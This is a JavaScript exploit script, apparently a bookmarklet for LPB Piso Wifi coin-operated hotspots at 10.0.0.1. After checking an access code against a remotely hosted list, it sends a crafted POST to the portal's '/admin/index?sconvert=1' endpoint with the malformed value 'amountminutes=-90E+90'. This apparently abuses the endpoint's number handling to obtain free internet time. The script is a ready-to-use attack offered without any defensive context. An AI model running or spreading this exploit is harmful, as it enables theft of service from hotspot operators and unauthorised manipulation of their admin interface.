(async function() {
if (window.location.hostname !== '10.0.0.1') {  
    if (confirm('You must be on http://10.0.0.1/ to use this. Go there now?')) {  
        window.location.href = 'http://10.0.0.1/';  
    }  
    return;  
}  

const CODES_URL = 'https://cdn.jsdelivr.net/gh/jimsbautistaparadero/Code@main/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/codes.txt';

const oldUI = document.getElementById('lpb-ui-root');  
if (oldUI) oldUI.remove();  

const root = document.createElement('div');  
root.id = 'lpb-ui-root';  
const shadow = root.attachShadow({ mode: 'open' });  

const style = document.createElement('style');  
style.textContent = `  
    .overlay { position: fixed; inset: 0; background: rgba(15, 15, 20, 0.85); backdrop-filter: blur(12px); display: flex; justify-content: center; align-items: center; z-index: 2147483647; font-family: system-ui, -apple-system, sans-serif; }  
    .modal { background: linear-gradient(145deg, #1e1e2e, #181825); color: #cdd6f4; width: 340px; border-radius: 20px; padding: 30px; box-shadow: 0 20px 50px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.05); text-align: center; border: 1px solid #313244; animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1); }  
    @keyframes slideUp { 0% { transform: translateY(20px) scale(0.95); opacity: 0; } 100% { transform: translateY(0) scale(1); opacity: 1; } }  
    h2 { margin: 0 0 10px; color: #89b4fa; font-size: 24px; font-weight: 700; letter-spacing: 0.5px; }  
    p { font-size: 15px; margin-bottom: 24px; color: #bac2de; line-height: 1.6; }  
    .btn-group { display: flex; gap: 12px; justify-content: center; }  
    button { border: none; padding: 12px 20px; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; transition: all 0.25s ease; box-shadow: 0 4px 6px rgba(0,0,0,0.2); width: 100%; outline: none; }  
    .btn-yes { background: linear-gradient(135deg, #89b4fa, #74c7ec); color: #11111b; }  
    .btn-yes:hover { transform: translateY(-2px); box-shadow: 0 6px 12px rgba(137, 180, 250, 0.4); filter: brightness(1.1); }  
    .btn-no { background: #45475a; color: #cdd6f4; }  
    .btn-no:hover { background: #585b70; transform: translateY(-2px); box-shadow: 0 6px 12px rgba(69, 71, 90, 0.4); }  
    .btn-close { background: linear-gradient(135deg, #f38ba8, #eba0ac); color: #11111b; margin-top: 10px; }  
    .btn-close:hover { transform: translateY(-2px); box-shadow: 0 6px 12px rgba(243, 139, 168, 0.4); filter: brightness(1.1); }  
    .spinner { width: 44px; height: 44px; border: 4px solid rgba(137, 180, 250, 0.2); border-top: 4px solid #89b4fa; border-radius: 50%; animation: spin 0.8s cubic-bezier(0.4, 0, 0.2, 1) infinite; margin: 0 auto 20px auto; }  
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }  
    .hidden { display: none !important; }  
    .warning-text { color: #f38ba8; font-size: 13px; margin-top: 16px; font-weight: 600; background: rgba(243, 139, 168, 0.1); padding: 8px; border-radius: 8px; }
    input { background: #11111b; border: 2px solid #313244; border-radius: 12px; padding: 14px; color: #cdd6f4; width: calc(100% - 32px); margin-bottom: 20px; text-align: center; font-size: 24px; font-weight: 700; letter-spacing: 4px; outline: none; transition: all 0.3s ease; box-shadow: inset 0 2px 4px rgba(0,0,0,0.2); }
    input:focus { border-color: #89b4fa; box-shadow: 0 0 0 3px rgba(137, 180, 250, 0.2); }
    input::placeholder { color: #45475a; letter-spacing: 4px; }
    strong { color: #cba6f7; }
    .error-title { color: #f38ba8; }
`;  
shadow.appendChild(style);  

const overlay = document.createElement('div');  
overlay.className = 'overlay';  
overlay.innerHTML = `  
    <div class="modal" id="modal">  
        <div id="content-check">  
            <div class="spinner"></div>  
            <h2>Checking System</h2>  
            <p>Verifying LPB Network...</p>  
        </div>  

        <div id="content-auth" class="hidden">  
            <h2>Activation</h2>  
            <p>Please enter your 6-digit access code.</p>  
            <input type="text" id="auth-code" maxlength="6" placeholder="••••••" autocomplete="off">  
            <button class="btn-yes" id="btn-verify">Verify Access</button>  
        </div>  
          
        <div id="content-prompt" class="hidden">  
            <h2>Requirements</h2>  
            <p>Strictly for <strong>LPB Piso Wifi</strong>.<br/><br/>Time must be above <strong>2 mins</strong> or insert <strong>₱1 coin</strong>.</p>  
            <div class="btn-group">  
                <button class="btn-yes" id="btn-yes">I have time</button>  
                <button class="btn-no" id="btn-no">I need to insert</button>  
            </div>  
            <p class="warning-text">Auto-reloading in 5s...</p>
        </div>  

        <div id="content-error" class="hidden">  
            <h2 class="error-title">Action Required</h2>  
            <p id="error-msg"></p>  
            <button class="btn-close" id="btn-close-err">Dismiss</button>  
        </div>  

        <div id="content-loading" class="hidden">  
            <div class="spinner"></div>  
            <h2>Processing</h2>  
            <p>Applying network changes...</p>  
        </div>  
    </div>  
`;  
shadow.appendChild(overlay);  
document.body.appendChild(root);  

const showView = (id) => {  
    ['content-check', 'content-auth', 'content-prompt', 'content-error', 'content-loading'].forEach(v => {  
        shadow.getElementById(v).classList.add('hidden');  
    });  
    shadow.getElementById(id).classList.remove('hidden');  
};  

shadow.getElementById('btn-close-err').onclick = () => root.remove();  

await new Promise(r => setTimeout(r, 800)); 
const textToSearch = (document.body.innerText + document.title).toLowerCase();  
const isLPB = textToSearch.includes('lpb') || textToSearch.includes('piso');  
  
if (!isLPB) {  
    shadow.getElementById('error-msg').innerText = "Only works on LPB Piso Wifi networks.";  
    showView('content-error');  
    setTimeout(() => window.location.reload(), 5000); 
    return;  
}  

showView('content-auth');  

shadow.getElementById('btn-verify').onclick = async () => {
    const inputCode = shadow.getElementById('auth-code').value.trim();
    
    if (inputCode.length !== 6) {
        alert("Code must be exactly 6 characters.");
        return;
    }

    showView('content-check');
    
    try {
        const response = await fetch(CODES_URL);
        const data = await response.text();
        const validCodes = data.split('\n').map(line => line.trim());

        if (validCodes.includes(inputCode)) {
            showView('content-prompt');
            startInactivityTimer();
        } else {
            shadow.getElementById('error-msg').innerText = "Invalid Access Code.";  
            showView('content-error');  
            setTimeout(() => window.location.reload(), 3000);
        }
    } catch (err) {
        shadow.getElementById('error-msg').innerText = "Network Error: Could not verify codes.";  
        showView('content-error');  
    }
};

let promptTimeout;
const startInactivityTimer = () => {
    promptTimeout = setTimeout(() => {
        window.location.reload();
    }, 5000);
};

shadow.getElementById('btn-no').onclick = () => {  
    clearTimeout(promptTimeout); 
    shadow.getElementById('error-msg').innerHTML = "Time must be > 2 mins<br/>or insert a ₱1 coin.";  
    showView('content-error');  
};  

shadow.getElementById('btn-yes').onclick = async () => {  
    clearTimeout(promptTimeout); 
    showView('content-loading');  

    const controller = new AbortController();
    const fetchTimeoutId = setTimeout(() => {
        controller.abort();
        window.location.reload();
    }, 5000);

    try {  
        await fetch('/admin/index?sconvert=1', {  
            method: 'POST',  
            headers: {  
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',  
                'X-Requested-With': 'XMLHttpRequest'  
            },  
            body: 'amountminutes=-90E+90', 
            signal: controller.signal      
        });  
    } catch (err) {  
    } finally {
        clearTimeout(fetchTimeoutId);
        window.location.reload();
    }
};
})();
